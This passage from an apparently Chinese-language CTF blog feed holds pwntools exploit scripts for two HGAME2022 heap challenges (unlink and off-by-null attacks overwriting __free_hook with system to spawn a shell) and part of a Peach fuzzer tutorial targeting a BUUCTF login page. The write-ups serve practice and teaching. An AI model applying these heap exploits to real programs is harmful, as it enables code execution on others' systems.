class="line">sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="changeable-note"><a href="#changeable-note" class="headerlink" title="changeable_note"></a>changeable_note</h3><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/103097/3/27197/21707/63c7b2c8Ff5b87dbc/81e0c45a66912503.png" style="zoom:80%;" /><p>edit é‡Œæœ‰ä¸ªæº¢å‡ºå‡½æ•°<code>gets</code>ï¼Œå› æ­¤å¯ä»¥æ„é€  unlink æ”¹å†™ notes æ•°ç»„çš„å†…å®¹ä¸ºæƒ³è¦çš„åœ°å€<code>&amp;_free_hook</code>ï¼Œç„¶åå†å°†ç›®æ ‡å‡½æ•°ç¯¡æ”¹ä¸º<code>system</code>ã€‚</p><p>exp å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&quot;./note&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./note&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index, size, content</span>):</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sh.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>, content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, payload</span>):</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sh.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(index).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    sh.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">note_addr = <span class="number">0x4040C0</span></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x20</span>, <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x20</span>, <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x100</span>, <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x20</span>, <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(note_addr + <span class="number">8</span> - <span class="number">0x18</span>) + p64(note_addr + <span class="number">8</span> - <span class="number">0x10</span>)</span><br><span class="line">payload += p64(<span class="number">0x20</span>) + p64(<span class="number">0x110</span>)</span><br><span class="line">payload += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">edit(<span class="number">1</span>, payload)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">2</span> + p64(elf.got[<span class="string">&#x27;free&#x27;</span>]) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]) + p64(elf.got[<span class="string">&#x27;atoi&#x27;</span>]) + p64(note_addr) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">edit(<span class="number">1</span>, payload)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, p64(elf.sym[<span class="string">&#x27;puts&#x27;</span>])[:-<span class="number">1</span>] + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">libc_base = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>, p64(system)[:-<span class="number">1</span>] + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="sized-note"><a href="#sized-note" class="headerlink" title="sized_note"></a>sized_note</h3><p>libc2.27 çš„ off-by-null æ¨¡æ¿é¢˜ã€‚</p><p>exp å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&quot;./note&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index, size, content</span>):</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sh.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>, content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, payload</span>):</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">    sh.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(index).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    sh.send(payload)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">11</span>):</span><br><span class="line">    add(i, <span class="number">0xF8</span>, <span class="string">&quot;a&quot;</span>*<span class="number">0xF7</span>)</span><br><span class="line">    </span><br><span class="line">add(<span class="number">12</span>, <span class="number">0x60</span>, <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, <span class="number">10</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">    </span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0xF0</span> + p64(<span class="number">0x200</span>))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x78</span>, <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x78</span>, <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">libc_base = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>] - <span class="number">0x10</span> - <span class="number">0x60</span> log.success(<span class="string">&quot;libc_base=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">__free_hook = libc_base + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x60</span>, <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">delete(<span class="number">12</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>, p64(__free_hook))</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x60</span>, <span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x60</span>, p64(system))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;é—²ç€æ—¶å°±å»æ‰“äº†ä¸‹æ­ç”µçš„ HGAME2022ï¼Œä»¥ä¸ºç¬¬ä¸€å‘¨çš„é¢˜ç›®éƒ½ä¼šè›®ç®€å•çš„ï¼Œæ²¡æƒ³åˆ°æ¯é“é¢˜éƒ½èŠ±äº†ä¸å°‘åŠŸå¤«ï¼Œå‡ºé¢˜äººç”šè‡³è¿˜åªæ˜¯å¤§äºŒå­¦ç”Ÿï¼Œé¡¿æ—¶æ„Ÿè§‰åˆ°å‚å·®äº†ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="wp" scheme="http://example.com/categories/ctf/wp/"/>
    
    
  </entry>
  
  <entry>
    <title>peachå­¦ä¹ åŠåœ¨webé¢†åŸŸçš„åº”ç”¨</title>
    <link href="http://example.com/2022/01/04/peach/"/>
    <id>http://example.com/2022/01/04/peach/</id>
    <published>2022-01-04T10:02:26.000Z</published>
    <updated>2023-02-20T06:22:46.433Z</updated>
    
    <content type="html"><![CDATA[<p>ç½‘ä¸Šå…³äºpeachæ¡†æ¶çš„èµ„æ–™å°‘çš„å¯æ€œã€‚æœ€åè·Ÿç€ä¸€ä½åšä¸»çš„åšå®¢å­¦äº†ä¸‹æ¥ï¼Œä¸è¿‡å­¦çš„æ˜¯Fuzz Web Apiã€‚å°±æ˜¯ä¸‹é¢çš„åšå®¢ã€‚æ„Ÿè°¢å¤§ä½¬ã€‚</p><blockquote><p><a href="https://blog.csdn.net/qq_27446553/article/details/103278465?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-4.no_search_link&spm=1001.2101.3001.4242.3&utm_relevant_index=7">PeachåŸç†ç®€ä»‹ä¸å®æˆ˜ï¼šä»¥Fuzz Web APIä¸ºä¾‹</a></p></blockquote><p>æ¥ä¸‹æ¥å°±ç®€å•è®°å½•ä¸€ä¸‹ä»Šå¤©ä¸‹åˆå¯¹peachæ¡†æ¶çš„ç²—æµ…å°è¯•ã€‚</p><h3 id="ä»¥ä¸‹æ˜¯å·¥ä½œæ–‡ä»¶å¤¹å’Œæˆæœå±•ç¤º"><a href="#ä»¥ä¸‹æ˜¯å·¥ä½œæ–‡ä»¶å¤¹å’Œæˆæœå±•ç¤º" class="headerlink" title="ä»¥ä¸‹æ˜¯å·¥ä½œæ–‡ä»¶å¤¹å’Œæˆæœå±•ç¤º"></a>ä»¥ä¸‹æ˜¯å·¥ä½œæ–‡ä»¶å¤¹å’Œæˆæœå±•ç¤º</h3><span id="more"></span><p>ç”¨äºæ„å»ºpeachæ•°æ®ã€çŠ¶æ€ã€é…ç½®æ¨¡å‹çš„å·¥ä½œæ–‡ä»¶å¤¹</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/36888/13/19529/96612/63f30d08Feb24adf9/a6aea8c9943dd22f.png" style="zoom:80%;" /><p>ç»ˆç«¯ä¸Šè·‘èµ·æ¥çš„æ•ˆæœ</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/147533/9/35684/456840/63f30d2dF161352fc/a08d0db0bc4af605.png" style="zoom:80%;" /><p>BurpSuiteä¸Šæ”¶åˆ°çš„ç›¸åº”æŠ¥æ–‡</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/98767/29/33250/297091/63f30d0bFb8fb82ca/6bd323358754cd20.png" style="zoom: 80%;" /><h2 id="ä»¥BUUCTFä¸Šçš„-HFCTF2020-EasyLoginä½œæµ‹è¯•ç›®æ ‡å¹³å°"><a href="#ä»¥BUUCTFä¸Šçš„-HFCTF2020-EasyLoginä½œæµ‹è¯•ç›®æ ‡å¹³å°" class="headerlink" title="ä»¥BUUCTFä¸Šçš„[HFCTF2020]EasyLoginä½œæµ‹è¯•ç›®æ ‡å¹³å°"></a>ä»¥BUUCTFä¸Šçš„[HFCTF2020]EasyLoginä½œæµ‹è¯•ç›®æ ‡å¹³å°</h2><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/139096/24/33662/90948/63f30d09Fb4c62a89/64c19668c4ee0bbd.png"  /><h3 id="1-è·å–è¯·æ±‚æŠ¥æ–‡çš„æ¨¡æ¿ä½œä¸ºlogin-bin"><a href="#1-è·å–è¯·æ±‚æŠ¥æ–‡çš„æ¨¡æ¿ä½œä¸ºlogin-bin" class="headerlink" title="1. è·å–è¯·æ±‚æŠ¥æ–‡çš„æ¨¡æ¿ä½œä¸ºlogin.bin"></a>1. è·å–è¯·æ±‚æŠ¥æ–‡çš„æ¨¡æ¿ä½œä¸ºlogin.bin</h3><p>æˆ‘ä»¬è¾“å…¥ç”¨æˆ·åå’Œå¯†ç åï¼Œç‚¹å‡»LOGINæŒ‰é’®ï¼Œæ­¤æ—¶å®¢æˆ·ç«¯å°±ä¼šå‘é€ä¸€ä¸ªè¯·æ±‚ï¼Œåœ¨BurpSuiteä¸Šæˆ‘ä»¬ä¾¿èƒ½æ‹¿åˆ°è¯¥è¯·æ±‚æ¨¡æ¿ï¼Œå¦‚ä¸‹å›¾ã€‚</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/146986/39/33790/197181/63f30d09F92d9b534/300bedb499608595.png"  /><p>æˆ‘ä»¬æ–°å»ºä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œå°†è¯¥æ¨¡æ¿å¤åˆ¶åˆ° login.bin é‡Œï¼Œå¦‚ä¸‹å›¾ã€‚ï¼ˆå¯ä»¥éšæ„å‘½åï¼Œä¿å­˜ä¸º.binæ–‡ä»¶å³å¯</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/135662/23/29143/105109/63f30e75F10af121f/30fb22f355f79ada.png" style="zoom: 80%;" /><h3 id="2-æ ¹æ®-binæ¨¡æ¿æ„é€ æ•°æ®æ¨¡å‹1-my-data-xml"><a href="#2-æ ¹æ®-binæ¨¡æ¿æ„é€ æ•°æ®æ¨¡å‹1-my-data-xml" class="headerlink" title="2. æ ¹æ®.binæ¨¡æ¿æ„é€ æ•°æ®æ¨¡å‹1-my_data.xml"></a>2. æ ¹æ®.binæ¨¡æ¿æ„é€ æ•°æ®æ¨¡å‹1-my_data.xml</h3><p>åˆ›å»ºä¸€ä¸ª1-my_data.xmlï¼Œå­˜æ”¾å¦‚ä¸‹ä»£ç ã€‚</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Peach</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://peachfuzzer.com/2012/Peach&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://peachfuzzer.com/2012/Peach ../peach.xsd&quot;</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">DataModel</span> <span class="attr">name</span>=<span class="string">&quot;my_data_model&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">DataModel</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;/<span class="name">Peach</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å…¶ä¸­DataModelå…ƒç´ ä¸‹æ”¾çš„ä¾¿æ˜¯å„è¡Œçš„<strong>å­—ç¬¦ä¸²æˆ–ç¬¦å·</strong>ï¼Œéœ€è¦åŒºåˆ†å¼€æ¥ã€‚ä»¥å‰å‡ è¡Œä¸ºä¾‹ã€‚tokenä»£è¡¨æ˜¯å¦ä¸ºç‰¹æ®Šç¬¦å·ï¼Œåƒ <strong>â€˜:â€™ â€˜&amp;â€™<strong>ä¹‹ç±»çš„éƒ½è¦è¿›è¡ŒåŒºåˆ†ã€‚mutableæ„ä¸ºå¯å˜çš„ï¼Œä¹Ÿå°±æ˜¯è¯¥æ•°æ®æ¨¡å—éœ€è¦<span style="color:red;font-weight:600">å˜å¼‚</span>çš„åœ°æ–¹ã€‚ç¬”è€…æ˜¯å¯¹</strong>admin</strong>å’Œ<strong>password</strong>çš„å€¼è®¾ç½®å¯å˜å¼‚ã€‚</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/143628/18/31276/331864/63f30ed8Fa32d3a88/5a67d3a1bd2bb451.png" style="zoom:80%;" /><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/49739/34/18962/171555/63f30e66F3b53cfe1/0ae126b36d5a29fe.png" style="zoom:80%;" /><p>æ„é€ DataModelæ˜¯ä¸€ä¸ªæ¯”è¾ƒè´¹åŠ›çš„è¿‡ç¨‹ï¼Œè¿˜å¥½Peachå®‰è£…åŒ…é‡Œæä¾›äº†æ ¡éªŒDataModelæ˜¯å¦ä¸æˆ‘ä»¬çš„.binå¯¹åº”çš„å·¥å…·Peach Validatorï¼Œæ‰è®©é•¿æ—¶é—´çš„åŠªåŠ›æœ‰äº†æ•ˆç‡ã€‚</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/194622/32/32714/457318/63f30ed7Ff9c6f305/7222cd64af03823e.png" style="zoom: 67%;" /><h3 id="3-æ„é€ é…ç½®æ¨¡å‹2-my-xml-config"><a href="#3-æ„é€ é…ç½®æ¨¡å‹2-my-xml-config" class="headerlink" title="3. æ„é€ é…ç½®æ¨¡å‹2-my_xml.config"></a>3. æ„é€ é…ç½®æ¨¡å‹2-my_xml.config</h3><p>éœ€æ ¹æ®ç›®æ ‡ç«¯å£è¿›è¡Œé…ç½®</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PitDefines</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">All</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IPv4</span> <span class="attr">key</span>=<span class="string">&quot;TargetAddress&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">value</span>=<span class="string">&quot;848e59df-143b-4177-bf5b-c6b70a18e040.node4.buuoj.cn&quot;</span> /&gt;</span></span><br><span class="line">  </span><br><span class="line"><span class="tag">&lt;<span class="name">Range</span> <span class="attr">key</span>=<span class="string">&quot;TargetPort&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">value</span>=<span class="string">&quot;81&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">min</span>=<span class="string">&quot;0&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">max</span>=<span class="string">&quot;65535&quot;</span> /&gt;</span></span><br><span class="line">   </span><br><span class="line"><span class="tag">&lt;<span class="name">Range</span> <span class="attr">key</span>=<span class="string">&quot;Timeout&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">value</span>=<span class="string">&quot;5000&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">min</span>=<span class="string">&quot;0&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">max</span>=<span class="string">&quot;999999&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">All</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">PitDefines</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Peach</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="4-æ„å»ºçŠ¶æ€æ¨¡å‹3-my-state-xml"><a href="#4-æ„å»ºçŠ¶æ€æ¨¡å‹3-my-state-xml" class="headerlink" title="4. æ„å»ºçŠ¶æ€æ¨¡å‹3-my_state.xml"></a>4. æ„å»ºçŠ¶æ€æ¨¡å‹3-my_state.xml</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Peach</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://peachfuzzer.com/2012/Peach&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://peachfuzzer.com/2012/Peach ../peach.xsd&quot;</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">&lt;!-- å¯¼å…¥æ•°æ®æ¨¡å‹ --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Include</span> <span class="attr">ns</span>=<span class="string">&quot;MyData&quot;</span> <span class="attr">src</span>=<span class="string">&quot;D:\\Fuzzâ€”â€”peach\\MyPeachPit\\1-my_data.xml&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">StateModel</span> <span class="attr">name</span>=<span class="string">&quot;My_State&quot;</span> <span class="attr">initialState</span>=<span class="string">&quot;state_one&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">State</span> <span class="attr">name</span>=<span class="string">&quot;state_one&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Action</span> <span class="attr">type</span>=<span class="string">&quot;output&quot;</span>&gt;</span></span><br><span class="line">                <span class="comment">&lt;!-- å¼•ç”¨åä¸ºmy_data_modelçš„ModelData --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">DataModel</span> <span class="attr">ref</span>=<span class="string">&quot;MyData:my_data_model&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">Data</span> <span class="attr">fileName</span>=<span class="string">&quot;D:\\Fuzzâ€”â€”peach\\MyPeachPit\\login.bin&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">Action</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;<span class="name">Action</span> <span class="attr">type</span>=<span class="string">&quot;input&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">DataModel</span> <span class="attr">name</span>=<span class="string">&quot;NULL&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">Blob</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">DataModel</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">Action</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">State</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">StateModel</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">Peach</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="5-æ„å»ºç»¼åˆæ¨¡å‹4-my-integrate-xml"><a href="#5-æ„å»ºç»¼åˆæ¨¡å‹4-my-integrate-xml" class="headerlink" title="5. æ„å»ºç»¼åˆæ¨¡å‹4-my_integrate.xml"></a>5. æ„å»ºç»¼åˆæ¨¡å‹4-my_integrate.xml</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Peach</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://peachfuzzer.com/2012/Peach&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://peachfuzzer.com/2012/Peach 